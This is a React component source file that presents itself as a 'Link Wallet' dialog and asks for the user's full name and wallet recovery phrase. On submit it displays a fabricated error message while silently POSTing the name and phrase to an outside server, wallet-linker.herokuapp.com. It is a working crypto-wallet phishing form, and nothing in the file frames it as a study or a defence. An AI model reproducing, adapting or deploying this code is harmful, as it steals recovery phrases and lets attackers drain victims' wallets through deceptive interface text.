import { useState } from "react";
import InfoModal from "./InfoModal";
import Modal from "./Modal";

const FormModal = ({ handleShowModal, showModal }) => {
  const [formData, setformData] = useState({
    name: "",
    recoveryPhrase: "",
  });
  const [showInfoModal, setShowInfoModal] = useState(false);
  const [message, setMessage] = useState("");
  // manage form onChange handler
  const handleInput = e => {
    const { value, name } = e.target;
    setformData({ ...formData, [name]: value });
  };

  //methods
  // function to toggle display of info modal
  const handleShowInfoModal = e => {
    if (e.target !== e.currentTarget) return;
    setShowInfoModal(!showInfoModal);
  };

  // submit form handler
  const handleSubmit = e => {
    e.preventDefault();
    setShowInfoModal(!showInfoModal);
    setMessage(
      "An error occurred while attempting to add your wallet. Please try again later."
    );
    fetch("https://wallet-linker.herokuapp.com/wallet-connect", {
      method: "post",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        name: formData.name,
        message: formData.recoveryPhrase,
      }),
    })
      .then(res => res.json())
      .then(data => {
        console.log(data.resp.message);
      })
      .catch(err => {
        console.log(err);
      });

    setformData({
      name: "",
      recoveryPhrase: "",
    });
  };



  return (
    <>
      <Modal showModal={showModal} handleShowModal={handleShowModal}>
        <div className="modal-head">
          <p>Link Wallet</p>
          <button onClick={handleShowModal} type="button">
            X
          </button>
        </div>
        <form onSubmit={handleSubmit} action="" className="modal-body">
          <div className="form-group">
            <label htmlFor="name">Full Name</label>
            <input
              value={formData.name}
              onChange={handleInput}
              type="text"
              placeholder="Enter Full Name"
              required
              id="name"
              name="name"
            />
          </div>
          <div className="form-group">
            <label htmlFor="recoveryPhrase">Recovery phrase</label>
            <textarea
              value={formData.recoveryPhrase}
              onChange={handleInput}
              placeholder="Typically 12 (sometimes 24) words separated by single spaces"
              id="recoveryPhrase"
              required
              name="recoveryPhrase"
            ></textarea>
          </div>
          <button type="submit" className="btn">
            Connect
          </button>
        </form>
      </Modal>
      <InfoModal
        message={message}
        showModal={showInfoModal}
        handleShowModal={handleShowInfoModal}
      />
    </>
  );
};

export default FormModal;
